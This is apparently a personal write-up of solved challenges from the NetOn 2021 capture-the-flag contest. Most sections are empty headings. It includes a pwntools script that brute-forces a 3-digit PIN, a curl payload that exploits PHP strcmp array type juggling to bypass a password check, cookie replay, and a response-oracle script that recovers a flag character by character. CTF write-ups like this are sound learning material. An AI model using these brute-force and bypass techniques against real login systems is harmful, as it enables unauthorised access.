# NetOn CTF 2021-03

I was excited to participate in my first ever CTF and enjoyed the experienced very much. Thanks to all of those involved in setting it up! ~<3

There were a total of 9 categories with 43 questions combined.

CTF Rules:

![](CTF%20Rules.png)

Final Top 10:

![](CTF%20Top%2010.png)

## Pwn Category

### Limited - 499

![](Challenge%20Screenshots/Pwn%20-%20Limited.png)

```py
#!/usr/bin/env python3

# Imports
from pwn import *

# Connect parameters
host = "167.99.129.209"
port = 10002

pwd = 0
while pwd < 1000:
	# Open connection
	s = remote(host, port)
	s.recvuntil("\n")
	# Loop over given tries (re-connect afterwards)
	for j in range(3):
		# Increment trial 3-digit password and send
		pwd += 1
		s.sendline(str(pwd))
		# Get return
		rstr = s.recvuntil("\n", drop=True).decode("latin-1")
		print(rstr)
		s.recvuntil("\n")
		# Check return string
		if rstr[0] != 'S':
			print(rstr)
			pwd += 1000
		# Visual check of progress
		if pwd % 100 == 0:
			print(pwd)
	# Close connection
	s.close()
```

Although the password is randomised (as could be deduced from the provided ELF), a 3-digit password can be easily brute-forced. So to no surprise, at some point this script got lucky and got returned:

```
Nice! The flag is NETON{N1c3_ByP4sS_My_Fr13eND!}
```

I'm not sure whether or not this counts as a bypass... but hey, it worked. : )



## Web Category

### Welcome to FilterLand - 208

![](Challenge%20Screenshots/Web%20-%20Welcome%20to%20FilterLand.png)

The website asks us for a password, nothing more, nothing less. By using the browser inspect tool (F-12) we see it posts our input to check.php. It also tells us they have made the PHP file available to us, so of course, we take a look :).

```php
<?php
    $FLAG =  (file_get_contents("/flag.txt")); //SECRET
    $PASSWORD = $_POST['password']; //User password

    if(isset($PASSWORD)){
    
    $PASSWORD = str_replace("s4cuRe_p4sW0rD","Nice_try!",$PASSWORD); //Replace

    if(strcmp('s4cuRe_p4sW0rD', $PASSWORD) == 0){ //Check
            
            echo $FLAG;
        
        }
        else{
            header("Location: /fail.html");
            die();
        }

    }
    else {
        echo "Give me what I'm looking for ):";
    }

?>
```

So the correct password is 's4cuRe_p4sW0rD', but they filter it out of our responses, how cheeky :c. Fortunately, or rather unfortunately, there is a vulnerability to the PHP strcmp functions. If instead of a string, we pass on something PHP recognises as a list it will return True, regardless of our input :).

I first tried to use HTML by going to the link
```
http://167.99.129.209:8000/check.php?password[]=oops
```
However, this did not work so I used curl instead
```sh
curl -d password[]=oops 167.99.129.209:8000/check.php
```
which happily returns our desired flag
```
NETON{arrays_FOR_the_WIN!}
```



### Picnicnic - 222

![](Challenge%20Screenshots/Web%20-%20Picnicnic.png)

Upon visiting the given website we are greeted with four appetising pictures of some cookies. Yum! However, there is a fifth. If we inspect the page (F-12) and check the 'Storage' tab we see another cookie, named 'flag' with the value 'TkVUT057MHV'. This looks a lot like base64 encoding, and indeed we find
```
NETON{0u
```

However, this is only a part of the flag...
Deleting our cookie and refreshing the connection just gives us the same cookie.
What about visiting through curl and sending this cookie with us. (Or setting the cookie value in your browser through inspect.)

```sh
curl -v --cookie "flag=TkVUT057MHV" http://167.99.129.209:8001
```
*Remember to use the verbose option '-v' in order to see the cookie information.*

Suddenly, our cookie value has changed! In fact, we can do this process four times to find all four pieces of the flag.

In base64 encoding
```
TkVUT057MHV  
yX2MwMGtpZV
NfNHJlXzR3Z
XMwbWUhfQ==
```
which gives us the flag
```
NETON{0ur_c00kieS_4re_4wes0me!}
```



### Let me in! - 245

![](Challenge%20Screenshots/Web%20-%20Let%20me%20in!.png)

```sh
curl -d captcha_challenge=d1ctXg --cookie "PHPSESSID=eh9nn1eko8aj2oe88d9oj542ec" http://167.99.129.209:8002/flag.php
```

Succes! Within the returned HTML we find

```
Nice evade! Take the flag: <b>NETON{7c49af83a2a68304273a8d330cebd93c}</b>
```



### Grades - 486

![](Challenge%20Screenshots/Web%20-%20Grades.png)

So somebody hacked the final exam grades to inflate their own... up to 1337, alright. Well in that case it seems our friend 'nUK<,IDt-.bvKL|./EO$%;k}@\_' is the culprit. However, his name is encrypted...

Within the html file we find some obfuscated javascript
```js
function encrypt(_0x40a681) {
    var _0x16b830 = 0x20, _0x561689 = 0x5e, _0x3db275 = 0x0, _0x38a41d = '';
    for (var _0x278871 = 0x0; _0x278871 < _0x40a681['length']; _0x278871++) {
         _0x38a41d = _0x38a41d + String['fromCharCode']((_0x40a681['charCodeAt'](_0x278871) + _0x3db275) % _0x561689 + _0x16b830), _0x3db275 = _0x3db275 + _0x40a681['charCodeAt'](_0x278871);
    }
    return _0x38a41d;
```
We can de-obfuscate this simple function by replacing the nonsense variable names with names that make sense, and by inserting values wherever possible. After this, we find a more readable encrypt function
```js
function encrypt(input) {
    var output = '', c0 = 0;
    for (var i = 0; i < input['length']; i++) {
        output = output + String['fromCharCode']((input['charCodeAt'](i) + c0) % 94 + 32),
        c0 = c0 + input['charCodeAt'](i);
    }
    return output;
```
Because of the modulo in there, it might be a bit rough to reverse directly, so let's just brute-force it instead. We can do so by simply trying out a character and seeing if our trial flag matches with the given encrypted flag. I used the following script
```

```


## Stego Category

### Jungle Meeting - 50

![](Challenge%20Screenshots/Stego%20-%20Jungle%20Meeting.png)

The four provided image files represent four of the character of Disney's 'Jungle Book'. Nothing too fancy here, the image with Kaa has an interesting meta-tag
```
<photoshop:City>NETON{l00k_at_m3tadata}</photoshop:City>
``` 
which I found using by looking at the strings output
```sh
strings kaa.jpg | grep 'NETON'
```
*Note that piping the output to grep means you will filter out anything that does not contain 'NETON', but it could also lead you to miss other hidden information.*

### Seeing blurry - UNSOLVED (50)



### Winter - 218

![](Challenge%20Screenshots/Stego%20-%20Winter.png)

At first glance the provided text file seems to only contain a simple quote. However, it seems like we can select much more than just the visible text. There are some hidden tabs and spaces as well! 

![](Solution%20Screenshots/Winter%20-%20Tabs%20and%20Spaces.png)

This kind of whitespace steganography is often referred to as 'snow', hence the title of the challenge. To recover the flag I used 'stegsnow' on Ubuntu,
```sh
stegsnow -C Winter.txt
```
and it revealed
```
NETON{wh1t3_spac3_tr1cks}
```

### Step by step - UNSOLVED (250)

We are giving the following, seemingly uinteresting picture.

![](Challenge%20Files/neton.bmp)

You can either use the magic selection tool (threshold: 0), the fill bucket (threshold: 0), or simply apply an auto-contrast. The latter options yields the following image

![](Solution%20Screenshots/StegSBS%20-%20Contrasted.png)


### Invisibility - UNSOLVED (500)





## OSINT Category

### Caesar's Secret - 163

![](Challenge%20Screenshots/Crypto%20-%20Caesar's%20Secret.png)



### Caputure The Flag - 436

![](Challenge%20Screenshots/OSINT%20-%20Capture%20The%20Flag.png)



## Crypto Category

### PawN PawN - 188

![](Challenge%20Screenshots/Crypto%20-%20PawN%20PawN.png)



### Weak xor - 239

![](Challenge%20Screenshots/Crypto%20-%20Weak%20xor.png)



### BritishScientific - 242

![](Challenge%20Screenshots/Crypto%20-%20BritishScientific.png)



### Facts Br0! - 244

![](Challenge%20Screenshots/Crypto%20-%20Facts%20Br0!.png)



### Not Morse - UNSOLVED (249)

![](Challenge%20Screenshots/Crypto%20-%20Not%20Morse.png)



### RSA... no primEs, no problEm - 500

![](Challenge%20Screenshots/Crypto%20-%20RSA...%20no%20primEs,%20no%20problEm.png)



## Coding Category

### Run Run Run - 215

![](Challenge%20Screenshots/Coding%20-%20Run%20Run%20Run.png)



### Step by step - 239

![](Challenge%20Screenshots/Coding%20-%20Step%20by%20step.png)

```py
#!/usr/bin/env python

# Imports
import requests

# All ASCII characters
chrs = [chr(i) for i in range(256)]
# All characters that returned 'getting closer'
chrs = '0134:ABCDEFGLNOSTU_abcdefghilmnorstuv{}' 

#  Trial flag
flag = "S"

i = 0
while i<len(chrs):
	# Create new flag to try
	new_flag = chrs[i] + flag 
	# Push the flag to the website
	push = requests.post("http://167.99.129.209:7788/index.php",data={'flag':new_flag})
	# Check return html
	pt = push.text[50:80]
	# Check for return
	print new_flag, pt
	if pt[0] == 'H':
		flag = new_flag
		i = 0
		print flag
	elif pt[0] == 'S':
		i += 1
	else:
		print 'Found it?:', flag
		break

# Print found result
print flag
```

With some trial and error I managed to get back

```
SuBsTr1nGs_4r3_FuN_4nD_C0uLD_b3_vUln3rAbL3
```

which, submitted as NETON{SuBsTr1nGs_4r3_FuN_4nD_C0uLD_b3_vUln3rAbL3}, turned out to be correct. : )



### SecretMessage - 247

![](Challenge%20Screenshots/Coding%20-%20SecretMessage.png)



## Forensics Category

### Infiltration - 183

![](Challenge%20Screenshots/Forensics%20-%20Infiltration.png)



### Picasso01 - 225

![](Challenge%20Screenshots/Forensics%20-%20Picasso01.png)



### Lost in Lab - 479

![](Challenge%20Screenshots/Forensics%20-%20Lost%20in%20Lab.png)



## Reversing Category

### File Bomb - UNSOLVED (475)



## Misc Category

### Inception - 183

![](Challenge%20Screenshots/Misc%20-%20Inception.png)



### Photogra.fy - 227

![](Challenge%20Screenshots/Misc%20-%20Photogra.fy.png)



### Kasiski the magician - UNSOLVED (235)

![](Challenge%20Screenshots/Misc%20-%20Kasiski%20the%20magician.png)



### MathTomata - 245

![](Challenge%20Screenshots/Misc%20-%20MathTomata.png)



### Gotta catch em flag - 248

![](Challenge%20Screenshots/Misc%20-%20Gotta%20catch%20em%20flag.png)



